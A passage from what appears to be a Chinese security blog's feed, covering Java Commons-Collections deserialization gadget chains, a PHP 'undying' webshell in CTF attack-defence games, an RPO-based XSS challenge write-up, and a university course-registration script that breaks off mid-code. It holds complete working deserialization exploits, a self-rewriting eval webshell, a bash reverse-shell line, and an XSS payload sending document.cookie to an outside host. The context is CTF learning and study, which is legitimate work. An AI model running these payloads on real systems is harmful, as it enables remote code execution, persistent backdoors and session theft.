Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(java.lang.Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/touch"</span>, <span class="string">"/dev/shm/asdasd_1"</span>&#125;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(fake);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line"></span><br><span class="line">        LazyMap lazyMap = (LazyMap) LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"placeholder"</span>);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">"zzzz"</span>);</span><br><span class="line"></span><br><span class="line">        Field field = chainedTransformer.getClass().getDeclaredField(<span class="string">"iTransformers"</span>); <span class="comment">// 将真正的 transformers 设置, 不然在生成 exp 时就会执行命令, 自己打自己了</span></span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(chainedTransformer, transformers);</span><br><span class="line">        innerMap.clear(); <span class="comment">// 清除 LazyMap 产生的缓存</span></span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样, 这套 exp 在 3, 4 都是通用的, 只需要更改 <code>LazyMap.decorate</code> 即可, 在 4 中是 <code>LazyMap.LazyMap</code>, 效果是是一样的, 只是方法名换了一个.</p>
<h2 id="CommonsCollections7"><a href="#CommonsCollections7" class="headerlink" title="CommonsCollections7"></a>CommonsCollections7</h2><p>仍然先看调用栈:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Payload method chain:</span><br><span class="line">    java.util.Hashtable.readObject</span><br><span class="line">    java.util.Hashtable.reconstitutionPut</span><br><span class="line">    org.apache.commons.collections.map.AbstractMapDecorator.equals</span><br><span class="line">    java.util.AbstractMap.equals</span><br><span class="line">    org.apache.commons.collections.map.LazyMap.get</span><br><span class="line">    org.apache.commons.collections.functors.ChainedTransformer.transform</span><br><span class="line">    org.apache.commons.collections.functors.InvokerTransformer.transform</span><br><span class="line">    java.lang.reflect.Method.invoke</span><br><span class="line">    sun.reflect.DelegatingMethodAccessorImpl.invoke</span><br><span class="line">    sun.reflect.NativeMethodAccessorImpl.invoke</span><br><span class="line">    sun.reflect.NativeMethodAccessorImpl.invoke0</span><br><span class="line">    java.lang.Runtime.exec</span><br></pre></td></tr></table></figure>

<p>仍然是用 LazyMap 导致 RCE, 相比 TransformingComparator, LazyMap 在 3, 4 中都可以用, 泛用性会更好. 这里触发 Lazy.get 的方式是利用 HashMap/Hashtable readObject 会重建内部的哈希表的特性. 在遇到 hash 碰撞的时候, 会调用其中一个对象的 equals 方法来对比两个对象是否相同来判断是否真的是 hash 碰撞. 在这之中使用的是父类 <code>AbstractMap</code> 的 equals 方法.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="keyword">this</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map))</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line">    <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;K, V&gt; e : entrySet()) &#123;</span><br><span class="line">            K key = e.getKey();</span><br><span class="line">            V value = e.getValue();</span><br><span class="line">            <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!(m.get(key) == <span class="keyword">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!value.equals(m.get(key))) <span class="comment">// &lt;-- 对于我们的 exp 来说, 会在这里会触发</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassCastException unused) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NullPointerException unused) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这个方法比较两个 Map 的大小, 并对比所有 key, value 都相等. 在其中使用了 get 方法, 触发了 Lazy.get.<br>在 ysoseiral 中使用的是 Hashtable 类, 实际上 HashMap 也是能够触发的.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> V <span class="title">putVal</span><span class="params">(<span class="keyword">int</span> hash, K key, V value, <span class="keyword">boolean</span> onlyIfAbsent,</span></span></span><br><span class="line"><span class="function"><span class="params">                   <span class="keyword">boolean</span> evict)</span> </span>&#123;</span><br><span class="line">        Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="keyword">int</span> n, i;</span><br><span class="line">    <span class="keyword">if</span> ((tab = table) == <span class="keyword">null</span> || (n = tab.length) == <span class="number">0</span>)</span><br><span class="line">        n = (tab = resize()).length;</span><br><span class="line">    <span class="keyword">if</span> ((p = tab[i = (n - <span class="number">1</span>) &amp; hash]) == <span class="keyword">null</span>)</span><br><span class="line">        tab[i] = newNode(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        Node&lt;K,V&gt; e; K k;</span><br><span class="line">        <span class="keyword">if</span> (p.hash == hash &amp;&amp;</span><br><span class="line">            ((k = p.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))  <span class="comment">// &lt;-- 这里进入 AbstractMap.equals</span></span><br><span class="line">            e = p;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">            e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(<span class="keyword">this</span>, tab, hash, key, value);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> binCount = <span class="number">0</span>; ; ++binCount) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((e = p.next) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    p.next = newNode(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line">                    <span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD - <span class="number">1</span>) <span class="comment">// -1 for 1st</span></span><br><span class="line">                        treeifyBin(tab, hash);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                    ((k = e.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                p = e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (e != <span class="keyword">null</span>) &#123; <span class="comment">// existing mapping for key</span></span><br><span class="line">            V oldValue = e.value;</span><br><span class="line">            <span class="keyword">if</span> (!onlyIfAbsent || oldValue == <span class="keyword">null</span>)</span><br><span class="line">                e.value = value;</span><br><span class="line">            afterNodeAccess(e);</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ++modCount;</span><br><span class="line">    <span class="keyword">if</span> (++size &gt; threshold)</span><br><span class="line">        resize();</span><br><span class="line">    afterNodeInsertion(evict);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后 exp 如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections7</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] fake = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="string">"placeholder"</span>),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(java.lang.Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/touch"</span>, <span class="string">"/dev/shm/asdasd_1"</span>&#125;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(fake);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap1 = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line">        innerMap1.put(<span class="string">"yy"</span>, <span class="string">"1"</span>); <span class="comment">// "yy".hashCode() == "zZ".hashCode() == 3872</span></span><br><span class="line">        HashMap innerMap2 = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line">        innerMap2.put(<span class="string">"zZ"</span>, <span class="string">"1"</span>);</span><br><span class="line"></span><br><span class="line">        LazyMap lazyMap1 = (LazyMap) LazyMap.decorate(innerMap1, chainedTransformer);</span><br><span class="line">        LazyMap lazyMap2 = (LazyMap) LazyMap.decorate(innerMap2, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        hashMap.put(lazyMap1, <span class="string">"placeholder"</span>);</span><br><span class="line">        hashMap.put(lazyMap2, <span class="string">"placeholder"</span>);</span><br><span class="line"></span><br><span class="line">        innerMap1.remove(<span class="string">"zZ"</span>); <span class="comment">// 在 put 的时候产生碰撞, 根据上面的分析调用 LazyMap.get, LazyMap 会将结果存入 innerMap 中缓存, 所以这里需要将其清除, 否则 hashcode 就不一样了 </span></span><br><span class="line"></span><br><span class="line">        Field field = chainedTransformer.getClass().getDeclaredField(<span class="string">"iTransformers"</span>); <span class="comment">// 同上, 将真正的 transformers 设置, 不然在生成 exp 时就会执行命令, 自己打自己了</span></span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(chainedTransformer, transformers);</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>可以看到这些 chain 最后均需要经过 InvokerTransformer 或者 InstantiateTransformer. commons-collections 的修复也是着力于重点, 直接 ban 掉这两个类的 readObject, 一劳永逸.<br>而这些中对于 commons-collections4, 比较实用的是 CommonsCollections2, CommonsCollections4. 对于 commons-collections3, 为 CommonsCollections6, CommonsCollections7. 利用能否成功只与 commons-collections 自身的版本有关, 而与 jre 的版本没有太大关系, 只要不要是远古版本即可. 而且实际上不少 chain 是两者都通用的, 只不过 ysoserial 没有编写, 只需要稍稍修改就行.  </p>
]]></content>
      <tags>
        <tag>web</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>对聊天室做的一些微小的工作</title>
    <url>/2018/02/22/%E5%AF%B9%E8%81%8A%E5%A4%A9%E5%AE%A4%E5%81%9A%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BE%AE%E5%B0%8F%E7%9A%84%E5%B7%A5%E4%BD%9C/</url>
    <content><![CDATA[<ol>
<li>对数据做了格式化处理, 所有数据都是以下格式, 但是 load 内的内容可以是任意json (字符串, 数组, 字典等), 且会被 AES 加密.</li>
</ol>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">example = &#123;</span><br><span class="line">    "key": "",  //RSA加密后的AESKey</span><br><span class="line">    "load": &#123;</span><br><span class="line">        "msgType": "",</span><br><span class="line">        "example": ""</span><br><span class="line">    &#125;,</span><br><span class="line">    "timeStamp": "",</span><br><span class="line">    "sign": "", </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<ol start="2">
<li><p>对 socket 做了简单的封装, 现在拥有心跳包机制 (TCP 自带的心跳包实在不好用) 以及对长数据的分包发送. </p>
</li>
<li><p>增加了数据库部分, 私钥相当于密码, 通过签名验证登陆. </p>
</li>
<li><p>数据在发送时会被压缩以节省流量.且因为 load 中的内容是用 AES 加密的, 也就是说其中的长度是不做限制, 可以用来进行传输文件等等 (当然我还没做233). </p>
</li>
</ol>
]]></content>
      <tags>
        <tag>misc</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>干掉 PHP 不死马</title>
    <url>/2019/04/04/%E5%B9%B2%E6%8E%89-PHP-%E4%B8%8D%E6%AD%BB%E9%A9%AC/</url>
    <content><![CDATA[<p>在 AWD 模式下经常碰到不死马, 不干掉的话就会一直被偷 flag, 很难受. 所以研究一下怎么干掉.  </p>
<a id="more"></a>

<h2 id="什么是不死马"><a href="#什么是不死马" class="headerlink" title="什么是不死马"></a>什么是不死马</h2><p>先说一下什么是不死马, 比如这种  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">ignore_user_abort(<span class="number">1</span>);</span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    $content = <span class="string">"&lt;?php error_reporting(0);if(sha1(\$_POST['pwd'])==='%pwd%')&#123;eval(\$_POST['cmd']);&#125;?&gt;"</span>;</span><br><span class="line">    file_put_contents(<span class="string">".shell.php"</span>, $content);</span><br><span class="line">    usleep(<span class="number">10000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>简单来说有以下特性:  </p>
<ul>
<li>访问后删除自己</li>
<li>即使断开连接也不会停止</li>
<li>驻留在内存中定时做某些事情, 比如上面这种就是不停的写 webshell</li>
</ul>
<p>根据行为也可以将不死马分为两种, 一种是 while(1) 不 sleep, 占用服务器资源, 卡机子,  还有一种是 sleep, 悄悄的留后门<br>如果不懂怎么干掉的话, 唯一的办法就是重启环境了, 而这在 AWD 中一般都是会倒扣不少分的…  </p>
<p>接下来了解一下 php 主流的两种运行模式 <code>php-fpm</code> 与 <code>php-apache</code> 这两种,<br><code>php-fpm</code> 适用于 <code>nginx</code> 和 <code>apache</code> 而 <code>php-apache</code> 自然是只能 <code>apache</code> 使用,<br>其中 fpm 的性能更好, 但是配置较为复杂(其实也不是很复杂 233),  在 AWD 我只遇见过 <code>php-apache</code> 这种 0.0<br>但是其实要干掉不死马, 步骤都差不多  </p>
<h2 id="干掉不死马"><a href="#干掉不死马" class="headerlink" title="干掉不死马"></a>干掉不死马</h2><h3 id="php-apache"><a href="#php-apache" class="headerlink" title="php-apache"></a>php-apache</h3><p>在这种模式下, 会在 fork 的一个 apache 进程里面以低权限用户来处理 php, 如下图<br><img src="https://i.loli.net/2019/04/04/5ca626d682f9d.png" alt=""><br>我们只要杀掉所以这些进程就行, 但在 AWD 中一般是没 root 权限的, 我们要干掉这些只能以低权限的身份来. 这里有两种办法  </p>
<ol>
<li><p>给自己在 web 目录下写一个 php, 里面是 </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(<span class="string">"kill `ps -ef | grep httpd | grep -v grep | awk '&#123;print $2&#125;'`"</span>);</span><br></pre></td></tr></table></figure>
<p>如果觉得碰到不死马了就直接访问, 杀掉所有 httpd 进程, 因为权限不够, root 的不会被杀掉, 这个守护进程会自动再 fork 进程, 不用担心服务挂  </p>
</li>
<li><p>写个 php 给自己弹个 shell, 在 shell 里面 killall, 这个更方便一点, 也更灵活</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(<span class="string">"bash -i &gt;&amp; /dev/tcp/127.0.0.1/23333 0&gt;&amp;1"</span>);</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="php-fpm"><a href="#php-fpm" class="headerlink" title="php-fpm"></a>php-fpm</h3><p>其实跟上面差不多, 只是进程名不同, 因为 fpm 是独立的服务, 不同于上面 apache 里面直接调用 php 的 api<br><img src="https://i.loli.net/2019/04/05/5ca62d252ca42.png" alt="">  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(<span class="string">"kill `ps -ef | grep php-fpm | grep -v grep | awk '&#123;print $2&#125;'`"</span>);</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>web</tag>
        <tag>awd</tag>
      </tags>
  </entry>
  <entry>
    <title>强网杯中出现的 RPO 导致的 XSS</title>
    <url>/2018/03/25/%E5%BC%BA%E7%BD%91%E6%9D%AF%E4%B8%AD%E5%87%BA%E7%8E%B0%E7%9A%84%20RPO%20%E5%AF%BC%E8%87%B4%E7%9A%84%20XSS/</url>
    <content><![CDATA[<p>注意这里是 RPO (Relative Path Overwrite) 相对路径覆盖不是 PRO, 主要是利用 Nginx 服务端和客户端对 <code>%2f</code> 解析的差异.<br>PS. 也就是说 Apache 是不会出现这个问题的, 它跟浏览器一样将 <code>%2f</code> 解析成名称的一部分而不是 <code>/</code> .  </p>
<a id="more"></a>

<p>Nginx 服务端可以正确识别 <code>%2f</code> 并将其解析成 <code>/</code> , 比如访问 <code>http://www.test.com/test/test2/..%2f..</code> , Nginx 会解析成<code>http://www.test.com/test1/test2/../..</code>, 最后服务端会返回 <code>http://www.test.com/</code> 的数据, 但客户端也就是浏览器, 不会解析 <code>%2f</code> 而是将其解析成 <code>http://www.test.com/test1/test2/..%2f..</code> , 将 <code>..%2f..</code> 当成一个在 <code>test1/test2/</code> 下的文件名. 这就造成了 xss 漏洞. 可以看到在 <code>http://39.107.33.96:20000/index.php</code> 中, 有一些相对路径的 <code>js</code> 文件, 如 <code>./jquery.min.js</code>.<br>同时在本题中我们可以控制在 <code>http://39.107.33.96:20000/index.php/view/article/xxx/</code> 中的内容, 所以我们可以构造 <code>http://39.107.33.96:20000/index.php/view/article/xxx/..%2f..%2f..</code> 让 bot 访问.<br>服务器返回的是 <code>http://39.107.33.96:20000/index.php</code> 的内容, 但浏览器加载的 <code>./jquery.min.js</code> 实际是<code>http://39.107.33.96:20000/index.php/view/article/xxx/jquery.min.js</code>, 同时这里 <code>/article/xxx/jquery.min.js</code> 被 rewrite 到了 <code>/article/xxx/</code>, 使 js 文件可控, 即导致了 xss 注入. 但这里服务器开了 <code>htmlspecialchars</code> , 同时开启了单引号转义, 最坑的是 phantomjs 不支持 ` 号. 想了半天用了 jsFuck, 又遇到了长度限制 1000, 而 jsFuck 长度随便就可以上万, 最后想到了可以从 ascii 中恢复字符串.</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a=<span class="built_in">String</span>.fromCharCode(<span class="number">0x68</span>,<span class="number">0x74</span>,<span class="number">0x74</span>,<span class="number">0x70</span>,<span class="number">0x3a</span>,<span class="number">0x2f</span>,<span class="number">0x2f</span>,<span class="number">0x78</span>,<span class="number">0x73</span>,<span class="number">0x73</span>,<span class="number">0x2e</span>,<span class="number">0x72</span>,<span class="number">0x6d</span>,<span class="number">0x62</span>,<span class="number">0x31</span>,<span class="number">0x32</span>,<span class="number">0x32</span>,<span class="number">0x2e</span>,<span class="number">0x63</span>,<span class="number">0x6e</span>,<span class="number">0x2f</span>,<span class="number">0x3f</span>,<span class="number">0x61</span>,<span class="number">0x3d</span>);</span><br><span class="line"><span class="built_in">window</span>.location.href=(a+<span class="built_in">document</span>.cookie);</span><br></pre></td></tr></table></figure>
<p>提交, 成功 get 到下一步.<br>然后我就不会了 233, 听大佬们说要用 iframe , 然而压根没听过, 不过至少学了一手  RPO , 还不错.</p>
]]></content>
      <tags>
        <tag>web</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>我, python, 抢课!</title>
    <url>/2017/12/29/%E6%88%91,%20python,%20%E6%8A%A2%E8%AF%BE!/</url>
    <content><![CDATA[<p>坑爹的选课系统. 人品不够, 技术来凑233 之前一直用的 selenium. 第一次使用 python 自带的 urllib, 顺便网上的教程真的是太乱了… 还是得靠自己摸索. </p>
<a id="more"></a>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> http.cookiejar <span class="keyword">import</span> MozillaCookieJar</span><br><span class="line"><span class="keyword">import</span> json </span><br><span class="line"><span class="keyword">import</span> _sha1</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">studentID=<span class="number">11111</span> <span class="comment">#, </span></span><br><span class="line">turnID=<span class="number">163</span> <span class="comment">#这一次是163</span></span><br><span class="line">courseList=&#123;<span class="number">252504</span>,<span class="number">252509</span>&#125; <span class="comment">#在这里添加课程ID</span></span><br><span class="line">YourUsername=<span class="string">'Here is your username'</span></span><br><span class="line">YourPassword=<span class="string">'Here is your password'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getOpener</span><span class="params">(cookieData)</span>:</span></span><br><span class="line">    opener=request.build_opener()</span><br><span class="line"> </span><br><span class="line">    Host=list()</span><br><span class="line">    Host.append(<span class="string">'Host'</span>)</span><br><span class="line">    Host.append(<span class="string">'jxglstu.hfut.edu.cn'</span>)</span><br><span class="line"> </span><br><span class="line">    UA=list()</span><br><span class="line">    UA.append(<span class="string">'User-Agent'</span>)</span><br><span class="line">    UA.append(<span class="string">'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'</span>)</span><br><span class="line"> </span><br><span class="line">    Referer=list()</span><br><span class="line">    Referer.append(<span class="string">'Referer'</span>)</span><br><span class="line">    Referer.append(<span class="string">'http://jxglstu.hfut.edu.cn/eams5-student/for-std/course-select/'</span>+str(studentID)+<span class="string">'/turn/'</span>+str(turnID)+<span class="string">'/select'</span>)</span><br><span class="line"> </span><br><span class="line">    Cookie=list()</span><br><span class="line">    Cookie.append(<span class="string">'Cookie'</span>)</span><br><span class="line">    Cookie.append(cookieData)</span><br><span class="line"> </span><br><span class="line">    opener.addheaders.clear()</span><br><span class="line">    opener.addheaders.append(Host)</span><br><span class="line">    opener.addheaders.append(UA)</span><br><span class="line">    opener.addheaders.append(Referer)</span><br><span class="line">    opener.addheaders.append(Cookie) <span class="comment">#构造HEADER</span></span><br><span class="line">    <span class="keyword">return</span> opener</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getRequestID</span><span class="params">(lessonID)</span>:</span></span><br><span class="line">    request.urlopen(<span class="string">'http://jxglstu.hfut.edu.cn/eams5-student/for-std/course-select'</span>) <span class="comment">#必须GET一下这个, 不然后台还没注册这个SESSION, 导致HTTP500</span></span><br><span class="line"> </span><br><span class="line">    postData=&#123;<span class="string">'studentAssoc'</span>:studentID,<span class="string">'lessonAssoc'</span>:lessonID,<span class="string">'courseSelectTurnAssoc'</span>:turnID,<span class="string">'scheduleGroupAssoc'</span>:<span class="string">''</span>,<span class="string">'virtualCost'</span>:<span class="string">'0'</span>&#125;</span><br><span class="line">    postData=parse.urlencode(postData).encode(encoding=<span class="string">'UTF8'</span>)</span><br><span class="line">    response=request.urlopen(<span class="string">'http://jxglstu.hfut.edu.cn/eams5-student/ws/for-std/course-select/add-request'</span>,postData)</span><br><span class="line">    requestID=response.read()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> requestID</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">charge</span><span class="params">(requestID)</span>:</span></span><br><span class="line">    postData=&#123;<span class="string">'studentId'</span>:studentID,<span class="string">'requestId'</span>:requestID&#125;</span><br><span class="line">    postData=parse.urlencode(postData).encode(encoding=<span class="string">'UTF8'</span>)</span><br><span class="line"> </span><br><span class="line">    response=request.urlopen(<span class="string">'http://jxglstu.hfut.edu.cn/eams5-student/ws/for-std/course-select/add-drop-response'</span>,postData)</span><br><span class="line">    result=response.read()</span><br><span class="line">    result=result.decode()</span><br><span class="line">    print(result)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCookie</span><span class="params">(username,password)</span>:</span> </span><br><span class="line">    aCookieJar=MozillaCookieJar()</span><br><span class="line">    handler=request.HTTPCookieProcessor(aCookieJar)</span><br><span class="line">    opener=request.build_opener(handler)</span><br><span class="line"> </span><br><span class="line">    UA=list()</span><br><span class="line">    UA.append(<span class="string">'User-Agent'</span>)</span><br><span class="line">    UA.append(<span class="string">'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'</span>)</span><br><span class="line"> </span><br><span class="line">    opener.addheaders.clear()</span><br><span class="line">    opener.addheaders.append(UA)  <span class="comment">#构造HEADER</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response=opener.open(<span class="string">'http://jxglstu.hfut.edu.cn/eams5-student/login-salt'</span>) <span class="comment">#得到盐</span></span><br><span class="line">        salt=response.read().decode(<span class="string">'UTF8'</span>)</span><br><span class="line">    <span class="keyword">except</span>: <span class="comment">#服务器有时候会404 应该是防DDOS</span></span><br><span class="line">        print(<span class="string">"服务器大姨妈来啦, 等一下再试"</span>)</span><br><span class="line">        os.system(<span class="string">"pause"</span>)</span><br><span class="line"> </span><br><span class="line">    salt=salt+<span class="string">'-'</span>+password</span><br><span class="line">    sha1Processer=_sha1.sha1()</span><br><span class="line">    sha1Processer.update(salt.encode())</span><br><span class="line">    password=sha1Processer.hexdigest()  <span class="comment">#密码加盐 </span></span><br><span class="line"> </span><br><span class="line">    